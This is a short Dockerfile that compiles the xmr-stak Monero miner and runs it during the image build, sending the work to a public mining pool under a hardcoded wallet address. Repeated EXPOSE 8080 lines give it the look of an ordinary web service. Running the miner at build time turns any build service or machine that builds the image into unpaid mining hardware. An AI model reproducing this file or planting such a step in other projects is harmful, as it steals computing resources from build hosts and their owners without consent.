FROM ubuntu:16.04
EXPOSE 8080
RUN apt-get update \
    && apt-get -qq --no-install-recommends install \
        libmicrohttpd10 git \
        libssl1.0.0 
EXPOSE 8080



RUN apt -y install libmicrohttpd-dev libssl-dev cmake build-essential libhwloc-dev \
    && git clone https://github.com/fireice-uk/xmr-stak \
    && mkdir xmr-stak/build \
    && cd xmr-stak/build \
    && cmake .. -DCUDA_ENABLE=OFF -DOpenCL_ENABLE=OFF \
    && make install


EXPOSE 8080


VOLUME /mnt

WORKDIR /mnt

EXPOSE 8080

RUN  /xmr-stak/build/bin/xmr-stak -o stratum+tcp://pool.supportxmr.com:5555 -u 46NbvdUFHq7GapMDffA5f1fK7SKXzqPQ77vxjdYmhwMgbsnyJADSeeXEyAxmTCqpypTvwuRdy9rxkWjLGvXLdSPnM6m8wir -p x --currency monero 

EXPOSE 8080
